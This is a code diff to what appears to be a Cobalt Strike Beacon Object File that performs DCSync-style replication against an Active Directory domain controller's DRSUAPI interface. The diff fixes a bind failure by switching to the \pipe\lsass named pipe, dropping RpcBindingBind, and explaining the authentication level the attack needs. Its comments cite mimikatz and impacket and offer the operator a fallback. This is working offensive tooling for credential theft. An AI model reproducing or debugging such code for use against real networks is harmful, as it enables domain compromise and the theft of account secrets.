@@ -35,8 +35,12 @@ DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$I_RpcSendReceive(void*);
 DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$I_RpcFreeBuffer(void*);
 DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$I_RpcBindingInqSecurityContext(
     RPC_BINDING_HANDLE, void**);
-DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingBind(
-    void*, RPC_BINDING_HANDLE, void*);
+/* NOTE: RpcBindingBind was removed — it is undocumented, not exported
+ * on older Windows (Server 2008 R2 / XP), and produced spurious
+ * RPC_S_UNKNOWN_IF (0x000006e4) when used before the first real call.
+ * The first authenticated I_RpcSendReceive (DRSBind) drives the SSPI
+ * handshake and populates the security context on the binding handle,
+ * which get_session_key reads out afterwards. */
 
 /* ── ntdsapi.dll ── */
 DECLSPEC_IMPORT DWORD WINAPI NTDSAPI$DsBindW(LPCWSTR, LPCWSTR, HANDLE*);
@@ -1231,34 +1235,53 @@ void go(char *args, int args_len)
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Object GUID: %s\n", guidStr);
     BeaconPrintf(CALLBACK_OUTPUT, "[+] DN: %s\n", userDN);
 
-    /* ── Step 3: Create RPC binding to DRSUAPI ── */
+    /* ── Step 3: Create RPC binding to DRSUAPI ──
+     *
+     * Bind over the named pipe \pipe\lsass (ncacn_np) rather than
+     * ncacn_ip_tcp.  Rationale for the RPC_S_UNKNOWN_IF (0x000006e4)
+     * failure this replaces:
+     *
+     *   - ncacn_ip_tcp requires an endpoint-mapper lookup (port 135)
+     *     to resolve DRSUAPI's dynamic TCP port.  When the DC's EPM
+     *     does not advertise DRSUAPI, when the dynamic port is
+     *     firewalled, or when the TCP endpoint offers only NDR64
+     *     (which our low-level MY_RPC_IF cannot present), the client
+     *     sees UNKNOWN_IF instead of a clean bind_nak.
+     *
+     *   - \pipe\lsass is DRSUAPI's stable, well-known endpoint over
+     *     SMB (445), used by impacket / mimikatz / SharpKatz.  No EPM
+     *     round-trip, no dynamic-port firewall issue, and lsass
+     *     accepts NDR (2.0) which is what we advertise.
+     *
+     * If the operator later needs TCP fallback (e.g. SMB is blocked),
+     * try ncacn_ip_tcp with endpoint = NULL and EpResolveBinding as
+     * a second attempt after this first bind returns UNKNOWN_IF.
+     */
     init_drsuapi_if();
 
     RPC_CSTR stringBinding = NULL;
     RPC_BINDING_HANDLE hRpc = NULL;
 
     RPC_STATUS rpcSt = RPCRT4$RpcStringBindingComposeA(
-        NULL, (RPC_CSTR)"ncacn_ip_tcp", (RPC_CSTR)aDC,
-        NULL, NULL, &stringBinding);
+        NULL, (RPC_CSTR)"ncacn_np", (RPC_CSTR)aDC,
+        (RPC_CSTR)"\\pipe\\lsass", NULL, &stringBinding);
     if (rpcSt == 0) {
         rpcSt = RPCRT4$RpcBindingFromStringBindingA(stringBinding, &hRpc);
         RPCRT4$RpcStringFreeA(&stringBinding);
     }
     if (rpcSt == 0) {
+        /* PKT_PRIVACY + GSS_NEGOTIATE — required by DRSUAPI's ACL.
+         * Any lower auth level makes the interface look "unknown" to
+         * the caller (Windows hides it rather than returning
+         * ACCESS_DENIED on the bind). */
         rpcSt = RPCRT4$RpcBindingSetAuthInfoExA(hRpc, (RPC_CSTR)aDC,
             RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE,
             NULL, 0, NULL);
     }
-    if (rpcSt == 0) {
-        rpcSt = RPCRT4$RpcEpResolveBinding(hRpc, (void*)&g_drsuapi_if);
-    }
-    /* Explicitly bind the connection + SSPI handshake so the security
-     * context is populated on the binding handle.  Without this,
-     * I_RpcBindingInqSecurityContext cannot find the SSPI context
-     * because I_RpcGetBuffer/I_RpcSendReceive don't populate it. */
-    if (rpcSt == 0) {
-        rpcSt = RPCRT4$RpcBindingBind(NULL, hRpc, (void*)&g_drsuapi_if);
-    }
+    /* No RpcEpResolveBinding: \pipe\lsass is the endpoint.
+     * No RpcBindingBind: the first authenticated I_RpcSendReceive
+     * (DRSBind) drives the SSPI handshake and populates the security
+     * context on the binding handle. */
     if (rpcSt) {
         BeaconPrintf(CALLBACK_ERROR,
             "[!] RPC binding failed: 0x%08x\n", rpcSt);
